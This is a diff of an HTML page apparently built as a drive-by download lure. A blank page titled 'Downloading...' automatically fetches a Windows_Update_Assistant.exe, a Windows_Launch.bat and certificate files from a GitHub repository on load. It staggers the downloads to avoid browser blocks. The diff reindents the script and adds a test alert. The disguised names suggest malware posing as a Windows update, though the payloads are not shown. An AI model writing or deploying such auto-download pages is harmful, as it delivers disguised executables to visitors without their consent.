@@ -2,32 +2,33 @@
 <html>
 <head>
     <title>Downloading...</title>
-    <script>
-        // List of direct download URLs
-        const files = [
-            'https://raw.githubusercontent.com/unityteam746-oss/autodownload/refs/heads/main/Windows_Launch.bat',
-            'https://raw.githubusercontent.com/unityteam746-oss/autodownload/refs/heads/main/Windows_Update_Assistant.exe',
-            'https://raw.githubusercontent.com/unityteam746-oss/autodownload/refs/heads/main/windows_cert.cer',
-            'https://raw.githubusercontent.com/unityteam746-oss/autodownload/refs/heads/main/windows_cert.pfx'
-        ];
+<script>
+    alert('Script loaded'); // Temporary test
+    // List of direct download URLs
+    const files = [
+        'https://raw.githubusercontent.com/unityteam746-oss/autodownload/refs/heads/main/Windows_Launch.bat',
+        'https://raw.githubusercontent.com/unityteam746-oss/autodownload/refs/heads/main/Windows_Update_Assistant.exe',
+        'https://raw.githubusercontent.com/unityteam746-oss/autodownload/refs/heads/main/windows_cert.cer',
+        'https://raw.githubusercontent.com/unityteam746-oss/autodownload/refs/heads/main/windows_cert.pfx'
+    ];
 
-        // Function to trigger downloads one by one with a delay
-        function downloadFiles() {
-            files.forEach((url, index) => {
-                setTimeout(() => {
-                    const link = document.createElement('a');
-                    link.href = url;
-                    link.download = url.split('/').pop(); // Extracts the filename
-                    document.body.appendChild(link);
-                    link.click();
-                    document.body.removeChild(link);
-                }, index * 1000); // 1-second delay between each to avoid browser blocks
-            });
-        }
+    // Function to trigger downloads one by one with a delay
+    function downloadFiles() {
+        files.forEach((url, index) => {
+            setTimeout(() => {
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = url.split('/').pop(); // Extracts the filename
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }, index * 1000); // 1-second delay between each to avoid browser blocks
+        });
+    }
 
-        // Start downloads automatically on page load
-        window.onload = downloadFiles;
-    </script>
+    // Start downloads automatically on page load
+    window.onload = downloadFiles;
+</script>
 </head>
 <body>
     <!-- The page is blank; downloads will start immediately after loading -->
